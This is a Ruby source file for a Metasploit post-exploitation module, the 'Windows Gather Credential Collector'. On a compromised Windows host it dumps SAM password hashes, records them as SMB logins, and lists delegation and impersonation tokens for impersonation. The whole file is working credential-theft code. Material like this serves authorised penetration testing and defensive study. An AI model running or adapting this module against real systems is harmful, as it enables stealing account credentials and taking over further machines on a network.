##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Credential Collector',
        'Description' => %q{ This module harvests credentials found on the host and stores them in the database.},
        'License' => MSF_LICENSE,
        'Author' => [ 'tebo[at]attackresearch.com'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              incognito_list_tokens
              priv_passwd_get_sam_hashes
            ]
          }
        }
      )
    )
  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    # Collect even without a database to store them.
    if session.framework.db.active
      db_ok = true
    else
      db_ok = false
    end

    # Make sure we're rockin Priv and Incognito
    session.core.use("priv") if not session.priv
    session.core.use("incognito") if not session.incognito

    # It wasn't me mom! Stinko did it!
    begin
      hashes = client.priv.sam_hashes
    rescue
      print_error('Error accessing hashes, did you migrate to a process that matched the target\'s architecture?')
      return
    end

    # Target infos for the db record
    addr = session.session_host
    # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)

    # Record hashes to the running db instance
    print_good "Collecting hashes..."

    hashes.each do |hash|
      # Build service information
      service_data = {
        address: addr,
        port: 445,
        service_name: 'smb',
        protocol: 'tcp',
      }

      # Build credential information
      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        private_type: :ntlm_hash,
        private_data: hash.lanman + ":" + hash.ntlm,
        username: hash.user_name,
        workspace_id: myworkspace_id
      }

      credential_data.merge!(service_data)
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED,
        workspace_id: myworkspace_id
      }

      login_data.merge!(service_data)
      create_credential_login(login_data)

      print_line "    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}"
    end

    # Record user tokens
    tokens = session.incognito.incognito_list_tokens(0)
    raise Rex::Script::Completed if not tokens

    # Meh, tokens come to us as a formatted string
    print_good "Collecting tokens..."
    (tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
      data = {}
      data[:host] = addr
      data[:type] = 'smb_token'
      data[:data] = token
      data[:update] = :unique_data

      print_line "    #{data[:data]}"
      report_note(data) if db_ok
    end
  end
end
